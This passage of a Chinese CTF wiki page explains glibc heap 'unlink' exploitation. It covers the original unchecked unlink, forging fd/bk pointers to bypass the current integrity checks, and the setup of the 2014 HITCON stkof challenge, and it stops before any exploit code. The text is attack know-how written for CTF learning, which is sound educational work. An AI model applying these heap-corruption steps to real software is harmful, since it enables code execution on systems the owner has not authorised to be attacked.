
<!doctype html>
<html lang="zh" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
        <meta name="description" content="SkYe Wiki">
      
      
      
        <meta name="author" content="SkYe231">
      
      
        <link rel="canonical" href="https://wiki.mrskye.cn/Pwn/glibc-heap/unlink/">
      
      <link rel="shortcut icon" href="../../../assets/images/favicon.png">
      <meta name="generator" content="mkdocs-1.1.2, mkdocs-material-6.2.4">
    
    
      
        <title>Unlink - SkYe Wiki</title>
      
    
    
      <link rel="stylesheet" href="../../../assets/stylesheets/main.15aa0b43.min.css">
      
        
        <link rel="stylesheet" href="../../../assets/stylesheets/palette.75751829.min.css">
        
          
          
          <meta name="theme-color" content="#ffffff">
        
      
    
    
    
      
        
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Noto+Sans:300,400,400i,700%7CSource+Code+Pro&display=fallback">
        <style>body,input{font-family:"Noto Sans",-apple-system,BlinkMacSystemFont,Helvetica,Arial,sans-serif}code,kbd,pre{font-family:"Source Code Pro",SFMono-Regular,Consolas,Menlo,monospace}</style>
      
    
    
    
    
      
        
<script>window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)},ga.l=+new Date,ga("create","UA-36723568-3","wiki.mrskye.cn"),ga("set","anonymizeIp",!0),ga("send","pageview"),document.addEventListener("DOMContentLoaded",function(){document.forms.search&&document.forms.search.query.addEventListener("blur",function(){if(this.value){var e=document.location.pathname;ga("send","pageview",e+"?q="+this.value)}})}),document.addEventListener("DOMContentSwitch",function(){ga("send","pageview",document.location.pathname)})</script>
<script async src="https://www.google-analytics.com/analytics.js"></script>
      
    
    
  </head>
  
  
    
    
    
    
    
    <body dir="ltr" data-md-color-scheme="" data-md-color-primary="white" data-md-color-accent="green">
      
  
    
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#unlink" class="md-skip">
          跳转至
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
      

<header class="md-header" data-md-component="header">
  <nav class="md-header-nav md-grid" aria-label="Header">
    <a href="https://wiki.mrskye.cn/" title="SkYe Wiki" class="md-header-nav__button md-logo" aria-label="SkYe Wiki">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18 22a2 2 0 002-2V4a2 2 0 00-2-2h-6v7L9.5 7.5 7 9V2H6a2 2 0 00-2 2v16a2 2 0 002 2h12z"/></svg>

    </a>
    <label class="md-header-nav__button md-icon" for="__drawer">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2z"/></svg>
    </label>
    <div class="md-header-nav__title" data-md-component="header-title">
      <div class="md-header-nav__ellipsis">
        <div class="md-header-nav__topic">
          <span class="md-ellipsis">
            SkYe Wiki
          </span>
        </div>
        <div class="md-header-nav__topic">
          <span class="md-ellipsis">
            
              Unlink
            
          </span>
        </div>
      </div>
    </div>
    
      <label class="md-header-nav__button md-icon" for="__search">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0116 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 019.5 16 6.5 6.5 0 013 9.5 6.5 6.5 0 019.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
      </label>
      
<div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="搜索" placeholder="搜索" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" data-md-state="active" required>
      <label class="md-search__icon md-icon" for="__search">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0116 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 019.5 16 6.5 6.5 0 013 9.5 6.5 6.5 0 019.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
      </label>
      <button type="reset" class="md-search__icon md-icon" aria-label="Clear" data-md-component="search-reset" tabindex="-1">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41z"/></svg>
      </button>
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            正在初始化搜索引擎
          </div>
          <ol class="md-search-result__list"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
    
    
      <div class="md-header-nav__source">
        
<a href="https://github.com/skyedai910/wiki.mrskye.cn/" title="前往 GitHub 仓库" class="md-source">
  <div class="md-source__icon md-icon">
    
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path d="M439.55 236.05L244 40.45a28.87 28.87 0 00-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 01-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 000 40.81l195.61 195.6a28.86 28.86 0 0040.8 0l194.69-194.69a28.86 28.86 0 000-40.81z"/></svg>
  </div>
  <div class="md-source__repository">
    skyedai910/wiki.mrskye.cn
  </div>
</a>
      </div>
    
  </nav>
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              
              <div class="md-sidebar md-sidebar--primary" data-md-component="navigation" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    




<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href="https://wiki.mrskye.cn/" title="SkYe Wiki" class="md-nav__button md-logo" aria-label="SkYe Wiki">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18 22a2 2 0 002-2V4a2 2 0 00-2-2h-6v7L9.5 7.5 7 9V2H6a2 2 0 00-2 2v16a2 2 0 002 2h12z"/></svg>

    </a>
    SkYe Wiki
  </label>
  
    <div class="md-nav__source">
      
<a href="https://github.com/skyedai910/wiki.mrskye.cn/" title="前往 GitHub 仓库" class="md-source">
  <div class="md-source__icon md-icon">
    
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path d="M439.55 236.05L244 40.45a28.87 28.87 0 00-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 01-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 000 40.81l195.61 195.6a28.86 28.86 0 0040.8 0l194.69-194.69a28.86 28.86 0 000-40.81z"/></svg>
  </div>
  <div class="md-source__repository">
    skyedai910/wiki.mrskye.cn
  </div>
</a>
    </div>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
      



  
  <li class="md-nav__item md-nav__item--nested">
    
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-1" type="checkbox" id="nav-1" >
    
    <label class="md-nav__link" for="nav-1">
      Pwn
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Pwn" data-md-level="1">
      <label class="md-nav__title" for="nav-1">
        <span class="md-nav__icon md-icon"></span>
        Pwn
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          



  
  <li class="md-nav__item md-nav__item--nested">
    
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-1-1" type="checkbox" id="nav-1-1" >
    
    <label class="md-nav__link" for="nav-1-1">
      格式化字符串
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="格式化字符串" data-md-level="2">
      <label class="md-nav__title" for="nav-1-1">
        <span class="md-nav__icon md-icon"></span>
        格式化字符串
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          



  <li class="md-nav__item">
    <a href="../../fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80%E4%BE%8B%E5%AD%90/" class="md-nav__link">
      格式化字符串漏洞基础例子
    </a>
  </li>

        
          
          
          



  <li class="md-nav__item">
    <a href="../../fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80%E5%88%A9%E7%94%A8/" class="md-nav__link">
      格式化字符串漏洞基础利用
    </a>
  </li>

        
          
          
          



  <li class="md-nav__item">
    <a href="../../fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9B%B2%E6%89%93/Bilnd_Pwn/" class="md-nav__link">
      格式化字符串盲打
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              
              <div class="md-sidebar md-sidebar--secondary" data-md-component="toc" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    
<nav class="md-nav md-nav--secondary" aria-label="目录">
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      目录
    </label>
    <ul class="md-nav__list" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#_1" class="md-nav__link">
    原理
  </a>
  
    <nav class="md-nav" aria-label="原理">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#unlink_1" class="md-nav__link">
    古老的 unlink
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#unlink_2" class="md-nav__link">
    当前的 unlink
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_2" class="md-nav__link">
    利用思路
  </a>
  
    <nav class="md-nav" aria-label="利用思路">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_3" class="md-nav__link">
    条件
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_4" class="md-nav__link">
    效果
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_5" class="md-nav__link">
    思路
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#2014-hitcon-stkof" class="md-nav__link">
    2014 HITCON stkof
  </a>
  
    <nav class="md-nav" aria-label="2014 HITCON stkof">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_6" class="md-nav__link">
    基本信息
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_7" class="md-nav__link">
    漏洞函数
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#io" class="md-nav__link">
    IO 缓冲区问题分析
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_8" class="md-nav__link">
    基本思路
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#exp" class="md-nav__link">
    EXP
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#2016-zctf-note2" class="md-nav__link">
    2016 ZCTF note2
  </a>
  
    <nav class="md-nav" aria-label="2016 ZCTF note2">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_9" class="md-nav__link">
    基本信息
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_10" class="md-nav__link">
    分析程序
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_11" class="md-nav__link">
    漏洞函数
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_12" class="md-nav__link">
    基本思路
  </a>
  
    <nav class="md-nav" aria-label="基本思路">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_13" class="md-nav__link">
    基本操作
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#note" class="md-nav__link">
    生成三个 note
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#chunk1-chunk2-chunk2" class="md-nav__link">
    释放 chunk1 - 覆盖 chunk2 - 释放 chunk2
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#libc" class="md-nav__link">
    泄露 libc 地址
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#atoi-got" class="md-nav__link">
    修改 atoi got
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#get-shell" class="md-nav__link">
    get shell
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_14" class="md-nav__link">
    总结
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#2017-insomnihack-wheelofrobots" class="md-nav__link">
    2017 insomni'hack wheelofrobots
  </a>
  
    <nav class="md-nav" aria-label="2017 insomni'hack wheelofrobots">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_15" class="md-nav__link">
    基本信息
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_16" class="md-nav__link">
    基本功能
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_17" class="md-nav__link">
    漏洞
  </a>
  
    <nav class="md-nav" aria-label="漏洞">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#off-by-one" class="md-nav__link">
    off-by-one
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_18" class="md-nav__link">
    堆溢出
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#uaf" class="md-nav__link">
    UAF
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_19" class="md-nav__link">
    利用思路
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#exp_1" class="md-nav__link">
    EXP
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#zctf-2016-note3" class="md-nav__link">
    ZCTF 2016 note3
  </a>
  
    <nav class="md-nav" aria-label="ZCTF 2016 note3">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_20" class="md-nav__link">
    基本情况
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_21" class="md-nav__link">
    基本功能
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_22" class="md-nav__link">
    漏洞
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_23" class="md-nav__link">
    思路
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#exp_2" class="md-nav__link">
    EXP
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          <div class="md-content">
            <article class="md-content__inner md-typeset">
              
                
                  <a href="https://github.com/skyedai910/wiki.mrskye.cn/blob/master/docs/Pwn/glibc-heap/unlink.md" title="编辑此页" class="md-content__button md-icon">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20.71 7.04c.39-.39.39-1.04 0-1.41l-2.34-2.34c-.37-.39-1.02-.39-1.41 0l-1.84 1.83 3.75 3.75M3 17.25V21h3.75L17.81 9.93l-3.75-3.75L3 17.25z"/></svg>
                  </a>
                
                
                <h1 id="unlink">Unlink<a class="headerlink" href="#unlink" title="Permanent link">&para;</a></h1>
<h2 id="_1">原理<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
<p>我们在利用 unlink 所造成的漏洞时，其实就是对 chunk 进行内存布局，然后借助 unlink 操作来达成修改指针的效果。</p>
<p>我们先来简单回顾一下 unlink 的目的与过程，其目的是把一个双向链表中的空闲块拿出来（例如 free 时和目前物理相邻的 free chunk 进行合并）。其基本的过程如下</p>
<p><img alt="unlink_smallbin_intro" src="img\unlink_smallbin_intro.png" /></p>
<p>下面我们首先介绍一下 unlink 最初没有防护时的利用方法，然后介绍目前利用 unlink 的方式。</p>
<h3 id="unlink_1">古老的 unlink<a class="headerlink" href="#unlink_1" title="Permanent link">&para;</a></h3>
<p>在最初 unlink 实现的时候，其实是没有对 chunk 的 size 检查和双向链表检查的，即没有如下检查代码。</p>
<div class="highlight"><pre><span></span><code><span class="c1">// 由于 P 已经在双向链表中，所以有两个地方记录其大小，所以检查一下其大小是否一致(size检查)</span>
<span class="k">if</span> <span class="p">(</span><span class="n">__builtin_expect</span> <span class="p">(</span><span class="n">chunksize</span><span class="p">(</span><span class="n">P</span><span class="p">)</span> <span class="o">!=</span> <span class="n">prev_size</span> <span class="p">(</span><span class="n">next_chunk</span><span class="p">(</span><span class="n">P</span><span class="p">)),</span> <span class="mi">0</span><span class="p">))</span>      \
      <span class="n">malloc_printerr</span> <span class="p">(</span><span class="s">&quot;corrupted size vs. prev_size&quot;</span><span class="p">);</span>               \
<span class="c1">// 检查 fd 和 bk 指针(双向链表完整性检查)</span>
<span class="k">if</span> <span class="p">(</span><span class="n">__builtin_expect</span> <span class="p">(</span><span class="n">FD</span><span class="o">-&gt;</span><span class="n">bk</span> <span class="o">!=</span> <span class="n">P</span> <span class="o">||</span> <span class="n">BK</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">!=</span> <span class="n">P</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span>                      \
  <span class="n">malloc_printerr</span> <span class="p">(</span><span class="n">check_action</span><span class="p">,</span> <span class="s">&quot;corrupted double-linked list&quot;</span><span class="p">,</span> <span class="n">P</span><span class="p">,</span> <span class="n">AV</span><span class="p">);</span>  \

  <span class="c1">// largebin 中 next_size 双向链表完整性检查 </span>
              <span class="k">if</span> <span class="p">(</span><span class="n">__builtin_expect</span> <span class="p">(</span><span class="n">P</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span> <span class="o">!=</span> <span class="n">P</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>              \
                <span class="o">||</span> <span class="n">__builtin_expect</span> <span class="p">(</span><span class="n">P</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span> <span class="o">!=</span> <span class="n">P</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span>    \
              <span class="n">malloc_printerr</span> <span class="p">(</span><span class="n">check_action</span><span class="p">,</span>                                      \
                               <span class="s">&quot;corrupted double-linked list (not small)&quot;</span><span class="p">,</span>    \
                               <span class="n">P</span><span class="p">,</span> <span class="n">AV</span><span class="p">);</span>
</code></pre></div>
<p><strong>这里我们以 32 位为例</strong>，假设堆内存最初的布局是下面的样子</p>
<p><img alt="old_unlink_vul" src="img\old_unlink_vul.png" /></p>
<p>现在有物理空间连续的两个 chunk（Q，Nextchunk），其中 Q 处于使用状态、Nextchunk 处于释放状态。那么如果我们通过某种方式（<strong>比如溢出</strong>）将 Nextchunk 的 fd 和 bk 指针修改为指定的值。则当我们 free(Q) 时</p>
<ul>
<li>glibc 判断这个块是 small chunk</li>
<li>判断前向合并，发现前一个 chunk 处于使用状态，不需要前向合并</li>
<li>判断后向合并，发现后一个 chunk 处于空闲状态，需要合并</li>
<li>继而对 Nextchunk 采取 unlink 操作</li>
</ul>
<p>那么 unlink 具体执行的效果是什么样子呢？我们可以来分析一下</p>
<ul>
<li>FD=P-&gt;fd = target addr -12</li>
<li>BK=P-&gt;bk = expect value</li>
<li>FD-&gt;bk = BK，即 *(target addr-12+12)=BK=expect value</li>
<li>BK-&gt;fd = FD，即 *(expect value +8) = FD = target addr-12</li>
</ul>
<p><strong>总结：</strong></p>
<div class="highlight"><pre><span></span><code><span class="c1">// 使用前提：使用传入参数</span>
<span class="n">P</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">=</span> <span class="n">target</span><span class="mi">-12</span><span class="p">;</span>
<span class="n">P</span><span class="o">-&gt;</span><span class="n">bk</span> <span class="o">=</span> <span class="n">expect</span> <span class="n">value</span><span class="p">;</span>
<span class="c1">// 作用效果：</span>
<span class="c1">// target addr 覆写为 expect value</span>
<span class="o">*</span><span class="p">(</span><span class="n">target</span> <span class="n">addr</span><span class="p">)</span> <span class="o">=</span> <span class="n">expect</span> <span class="n">value</span><span class="p">;</span>
<span class="c1">// expect value 覆写为 target addr -12</span>
<span class="o">*</span><span class="p">(</span><span class="n">expect</span> <span class="n">value</span> <span class="o">+</span><span class="mi">8</span><span class="p">)</span> <span class="o">=</span> <span class="n">target</span> <span class="n">addr</span> <span class="mi">-12</span><span class="p">;</span>
</code></pre></div>
<p><strong>看起来我们似乎可以通过 unlink 直接实现任意地址读写的目的，但是我们还是需要确保 expect value +8 地址具有可写的权限。</strong></p>
<p>比如说我们将 target addr 设置为某个 got 表项，那么当程序调用对应的 libc 函数时，就会直接执行我们设置的值（expect value）处的代码。<strong>需要注意的是，expect value+8 处的值被破坏了，需要想办法绕过。</strong></p>
<h3 id="unlink_2">当前的 unlink<a class="headerlink" href="#unlink_2" title="Permanent link">&para;</a></h3>
<p>**但是，现实是残酷的。。**我们刚才考虑的是没有检查的情况，但是一旦加上检查，就没有这么简单了。我们看一下对 fd 和 bk 的检查</p>
<div class="highlight"><pre><span></span><code><span class="c1">// fd bk</span>
<span class="c1">// FD的下一个chunk是否为P；BK的上一个chunk是否为P；</span>
<span class="k">if</span> <span class="p">(</span><span class="n">__builtin_expect</span> <span class="p">(</span><span class="n">FD</span><span class="o">-&gt;</span><span class="n">bk</span> <span class="o">!=</span> <span class="n">P</span> <span class="o">||</span> <span class="n">BK</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">!=</span> <span class="n">P</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span>                      \
  <span class="n">malloc_printerr</span> <span class="p">(</span><span class="n">check_action</span><span class="p">,</span> <span class="s">&quot;corrupted double-linked list&quot;</span><span class="p">,</span> <span class="n">P</span><span class="p">,</span> <span class="n">AV</span><span class="p">);</span>  \
</code></pre></div>
<p>假如此时 FD、BK 指针内容为：</p>
<ul>
<li>FD-&gt;bk = target addr - 12 + 12=target_addr</li>
<li>BK-&gt;fd = expect value + 8</li>
</ul>
<p>那么我们上面所利用的修改 GOT 表项的方法就<sub>~可能</sub>~不可用了，但是我们可以通过伪造的方式绕过这个机制。</p>
<p>首先我们通过覆盖，将 nextchunk 的 FD 指针指向了 fakeFD，将 nextchunk 的 BK 指针指向了 fakeBK 。那么为了通过验证，我们需要</p>
<ul>
<li><code>fakeFD -&gt; bk == P</code> &lt;=&gt; <code>*(fakeFD + 12) == P</code></li>
</ul>
<p>前一个 chunk bk 指向 P </p>
<ul>
<li><code>fakeBK -&gt; fd == P</code> &lt;=&gt; <code>*(fakeBK + 8) == P</code></li>
</ul>
<p>后一个 chunk fd 指向 P</p>
<p>当满足上述两式时，可以进入 Unlink 的环节，进行如下操作：</p>
<ul>
<li><code>fakeFD -&gt; bk = fakeBK</code> &lt;=&gt; <code>*(fakeFD + 12) = fakeBK</code></li>
</ul>
<p>前一个 chunk bk 更新为后一个 chunk 地址</p>
<ul>
<li><code>fakeBK -&gt; fd = fakeFD</code> &lt;=&gt; <code>*(fakeBK + 8) = fakeFD</code></li>
</ul>
<p>后一个 chunk fd 更新为前一个 chunk 地址</p>
<p><strong>小结</strong></p>
<div class="highlight"><pre><span></span><code><span class="c1">// 规避检查伪造条件</span>
<span class="c1">// fakeFD == P-&gt;fd; fakeBK == P-&gt;bk;</span>
<span class="o">*</span><span class="p">(</span><span class="n">fakeFD</span> <span class="o">+</span> <span class="mi">12</span><span class="p">)</span> <span class="o">==</span> <span class="n">P</span><span class="p">;</span>
<span class="o">*</span><span class="p">(</span><span class="n">fakeBK</span> <span class="o">+</span> <span class="mi">8</span><span class="p">)</span> <span class="o">==</span> <span class="n">P</span><span class="p">;</span>
<span class="c1">// unlink 结果</span>
<span class="o">*</span><span class="p">(</span><span class="n">fakeFD</span> <span class="o">+</span> <span class="mi">12</span><span class="p">)</span> <span class="o">=</span> <span class="n">fakeBK</span><span class="p">;</span>
<span class="o">*</span><span class="p">(</span><span class="n">fakeBK</span> <span class="o">+</span> <span class="mi">8</span><span class="p">)</span> <span class="o">=</span> <span class="n">fakeFD</span><span class="p">;</span>
</code></pre></div>
<p>如果让 fakeFD + 12 和 fakeBK + 8 指向同一个指向 P 的指针，那么：</p>
<div class="highlight"><pre><span></span><code><span class="c1">// fakeFD + 12 = P;     fakeBK + 8 = P;</span>
<span class="o">*</span><span class="p">(</span><span class="n">fakeFD</span> <span class="o">+</span> <span class="mi">12</span><span class="p">)</span> <span class="o">=</span> <span class="o">*</span><span class="n">P</span> <span class="o">=</span> <span class="n">fakeBK</span> <span class="o">=</span> <span class="n">P</span> <span class="o">-</span> <span class="mi">8</span><span class="p">;</span>
<span class="o">*</span><span class="p">(</span><span class="n">fakeBK</span> <span class="o">+</span> <span class="mi">8</span><span class="p">)</span> <span class="o">=</span> <span class="o">*</span><span class="n">P</span> <span class="o">=</span> <span class="n">fakeFD</span> <span class="o">=</span> <span class="n">P</span> <span class="o">-</span> <span class="mi">12</span><span class="p">;</span>
</code></pre></div>
<p>化简后 unlink 结果为：</p>
<ul>
<li><code>*P = P - 8</code></li>
<li><code>*P = P - 12</code></li>
</ul>
<p>即通过此方式，<strong>P 的指针指向了比自己低 12 的地址处</strong>。此方法虽然不可以实现任意地址写，但是可以修改指向 chunk 的指针，这样的修改是可以达到一定的效果的。</p>
<blockquote>
<p>这里指的低 12 是在 32 位系统下，如果是 64 位系统就是 3*8 = 24 。</p>
<p>归纳起来就是**将 P 指针指向比 P 低 3 个机器周期的地址处**</p>
</blockquote>
<p>如果我们想要使得两者都指向 P，只需要按照如下方式修改即可</p>
<p><img alt="new_unlink_vul" src="img\new_unlink_vul.png" /></p>
<p>需要注意的是，这里我们并没有违背下面的约束，因为 P 在 Unlink 前是指向正确的 chunk 的指针。</p>
<div class="highlight"><pre><span></span><code>    <span class="c1">// 由于P已经在双向链表中，所以有两个地方记录其大小，所以检查一下其大小是否一致。</span>
    <span class="c1">// 判断当前大小 chunksize 与 nextchunk 的 prev_size 记录值是否一致</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">__builtin_expect</span> <span class="p">(</span><span class="n">chunksize</span><span class="p">(</span><span class="n">P</span><span class="p">)</span> <span class="o">!=</span> <span class="n">prev_size</span> <span class="p">(</span><span class="n">next_chunk</span><span class="p">(</span><span class="n">P</span><span class="p">)),</span> <span class="mi">0</span><span class="p">))</span>      \
      <span class="n">malloc_printerr</span> <span class="p">(</span><span class="s">&quot;corrupted size vs. prev_size&quot;</span><span class="p">);</span>               \
</code></pre></div>
<p><strong>此外，其实如果我们设置 next chunk 的 fd 和 bk 均为 nextchunk 的地址也是可以绕过上面的检测的。但是这样的话，并不能达到修改指针内容的效果。</strong></p>
<h2 id="_2">利用思路<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
<h3 id="_3">条件<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h3>
<ol>
<li>UAF ，可修改 free 状态下 smallbin 或是 unsorted bin 的 fd 和 bk 指针</li>
<li>已知位置存在一个指针指向可进行 UAF 的 chunk</li>
</ol>
<p><img alt="unlink利用" src="img\unlink利用.jpg" /></p>
<h3 id="_4">效果<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h3>
<p>使得已指向 UAF chunk 的指针 ptr 变为 ptr - 0x18</p>
<p><img alt="unlink效果" src="img\unlink效果.jpg" /></p>
<h3 id="_5">思路<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h3>
<p>设指向可 UAF chunk 的指针的地址为 ptr</p>
<ol>
<li>修改 fd 为 ptr - 0x18</li>
<li>修改 bk 为 ptr - 0x10</li>
<li>触发 unlink</li>
</ol>
<p>ptr 处的指针会变为 ptr - 0x18。</p>
<h2 id="2014-hitcon-stkof">2014 HITCON stkof<a class="headerlink" href="#2014-hitcon-stkof" title="Permanent link">&para;</a></h2>
<blockquote>
<p>做题环境：Ubuntu 16.04</p>
</blockquote>
<h3 id="_6">基本信息<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h3>
<div class="highlight"><pre><span></span><code>Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      No PIE (0x400000)

stkof: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked
</code></pre></div>
<p>程序存在 4 个功能，经过 IDA 分析后可以分析功能如下</p>
<ul>
